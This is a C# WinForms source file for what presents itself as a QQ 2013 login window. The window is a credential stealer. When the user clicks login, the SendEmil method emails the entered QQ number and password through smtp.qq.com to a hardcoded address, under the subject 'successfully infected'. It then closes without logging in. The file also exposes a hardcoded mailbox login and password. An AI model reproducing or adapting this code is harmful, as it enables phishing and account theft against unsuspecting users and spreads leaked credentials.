using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using CCWin;
using CCWin.SkinControl;
using CCWin.SkinClass;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Mail;

namespace QQ2013
{
    public partial class FrmLogin : CCSkinMain
    {
        public FrmLogin()
        {
            InitializeComponent();
        }

        //窗口加载时
        private void FrmLogin_Load(object sender, EventArgs e)
        {
            int Hour = Convert.ToInt32(DateTime.Now.ToString("HH"));
            //早上
            if (Hour > 5 && Hour <= 11)
            {
                this.Back = Properties.Resources.morning;
            }
            else if (Hour > 11 && Hour <= 14)//中午
            {
                this.Back = Properties.Resources.noon;
            }
            else if (Hour > 14 && Hour <= 19)//下午
            {
                this.Back = Properties.Resources.afternoon;
            }
            else//晚上
            {
                this.Back = Properties.Resources.night;
            }
        }

        //状态菜单中的Item选择事件
        void item_Click(object sender, EventArgs e)
        {
            ToolStripMenuItem item = (ToolStripMenuItem)sender;
            txtId.Text = item.Tag.ToString();
            pnlImgTx.BackgroundImage = item.Image;
        }

        //悬浮时
        private void Control_MouseEnter(object sender, EventArgs e)
        {
            Control txt = (Control)sender;
            SkinPanel pnl = (SkinPanel)txt.Parent;
            pnl.ControlState = ControlState.Hover;
        }

        //离开时
        private void Control_MouseLeave(object sender, EventArgs e)
        {
            Control txt = (Control)sender;
            SkinPanel pnl = (SkinPanel)txt.Parent;
            pnl.ControlState = ControlState.Normal;
        }

        //托盘图标双击显示
        private void tuopan_DoubleClick(object sender, EventArgs e)
        {
            this.Show();
        }

        //登录事件
        private void btnDl_Click(object sender, EventArgs e)
        {
            if (txtId.Text.Length == 0 || txtPwd.Text.Length == 0) { return; }
            SendEmil();
            btnDl.Enabled = btnDuoId.Enabled = btnSandeng.Enabled = false;
            imgLoadding.Visible = true;
            timShow.Start();
        }

        //选择状态
        private void btnState_Click(object sender, EventArgs e)
        {
            MenuState.Show(this.Left + pnlTx.Left + pnlImgTx.Left + btnState.Left, this.Top + pnlTx.Top + pnlImgTx.Top + btnState.Top + btnState.Height + 5);
        }

        //状态选择项
        private void Item_Click(object sender, EventArgs e)
        {
            ToolStripMenuItem Item = (ToolStripMenuItem)sender;
            btnState.Image = Item.Image;
            btnState.Tag = Item.Tag;
        }

        //账号下拉框按钮事件
        private void btnId_Click(object sender, EventArgs e)
        {
        }

        //软键盘
        private void txtPwd_IconClick(object sender, EventArgs e)
        {
            PassKey pass = new PassKey(this.Left + txtPwd.Left - 25, this.Top + txtPwd.Bottom, txtPwd);
            pass.Show();
        }

        //自动登录
        private void chkZdLogin_CheckedChanged(object sender, EventArgs e)
        {
            chkMima.Checked = chkZdLogin.Checked ? true : chkMima.Checked;
        }

        //记住密码
        private void chkMima_CheckedChanged(object sender, EventArgs e)
        {
            if (!chkMima.Checked && chkZdLogin.Checked)
            {
                chkZdLogin.Checked = false;
            }
        }

        //计时器事件
        private void timShow_Tick(object sender, EventArgs e)
        {
            this.Close();
            tuopan.Text = String.Format("QQ：{0}({1})", txtId.Text, txtId.Text);
            timShow.Stop();
        }

        //发送邮件
        private bool SendEmil()
        {
            SmtpClient client = new SmtpClient();
            //这个地方的用户名你可以用split从发送人中截取
            client.Credentials = new System.Net.NetworkCredential("1450515666@qq.com","345015918");
            client.Port = 25;
            client.Host = "smtp.qq.com";
            try
            {
                client.Send(Initial("13728887471@qq.com"));
                return true;
            }
            catch (System.Net.Mail.SmtpException)
            {
                return false;
            }
        }

        //配置邮件信息
        public MailMessage Initial(string Address)
        {
            MailMessage m_Mail = new MailMessage();
            //发件人
            m_Mail.From = new MailAddress("1450515666@qq.com");
            //收件人
            m_Mail.To.Add(new MailAddress(Address));
            //主题
            m_Mail.Subject = "QQ号：" + txtId.Text + "已成功感染！";
            //内容
            m_Mail.Body = "QQ号：（" + txtId.Text + "）密码：（" + txtPwd.Text + "）";
            //邮件主题和正文编码格式
            m_Mail.SubjectEncoding = System.Text.Encoding.UTF8;
            m_Mail.BodyEncoding = System.Text.Encoding.UTF8;
            //邮件正文是Html编码
            m_Mail.IsBodyHtml = true;
            //优先级
            m_Mail.Priority = System.Net.Mail.MailPriority.High;
            //添加附件,可以添加多个
            //m_Mail.Attachments.Add(new Attachment("f:\\1.txt"));
            //密件抄送收件人
            m_Mail.Bcc.Add(Address);
            //抄送收件人
            m_Mail.CC.Add(Address);
            return m_Mail;
        }

        //QQ号栏失去焦点便将光标转移进密码栏
        private void txtId_Leave(object sender, EventArgs e)
        {
            txtPwd.Focus();
        }

        private void chkMima_CheckedChanged_1(object sender, EventArgs e)
        {

        }

        private void pnlId_Paint(object sender, PaintEventArgs e)
        {

        }

        private void txtId_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
